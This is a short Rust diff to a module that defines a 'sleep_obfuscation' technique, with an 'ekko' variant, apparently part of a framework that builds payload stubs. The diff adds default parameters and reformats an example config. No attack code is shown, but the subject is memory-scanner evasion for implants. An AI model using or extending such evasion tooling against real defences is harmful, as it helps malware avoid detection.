@@ -123,6 +123,19 @@ pub fn default_encrypt_regions() -> Vec<EncryptRegion> {
     vec![EncryptRegion::Payload]
 }
 
+impl Default for Params {
+    /// Defaults to the canonical ekko variant, a 5-second sleep and the payload
+    /// region only (see [`default_variant`], [`default_sleep_ms`],
+    /// [`default_encrypt_regions`]).
+    fn default() -> Self {
+        Self {
+            variant: default_variant(),
+            sleep_ms: default_sleep_ms(),
+            encrypt_regions: default_encrypt_regions(),
+        }
+    }
+}
+
 /// Static metadata for the sleep-obfuscation preparation.
 pub const DEF: TechniqueDef = TechniqueDef {
     name: "sleep_obfuscation",
@@ -135,7 +148,7 @@ pub const DEF: TechniqueDef = TechniqueDef {
     readme: include_str!("README.md"),
     stub_fragment: include_str!("stub_fragment.rs"),
     params_example:
-        "technique: sleep_obfuscation\nvariant: ekko\nsleep_ms: 5000\nencrypt_regions: [payload]\n",
+        "technique: sleep_obfuscation\nparams:\n  variant: ekko\n  sleep_ms: 5000\n  encrypt_regions: [payload]\n",
     // The timer-queue mechanism calls Win32 APIs resolved dynamically at
     // runtime; nothing goes through the syscall layer.
     syscalls: &[],
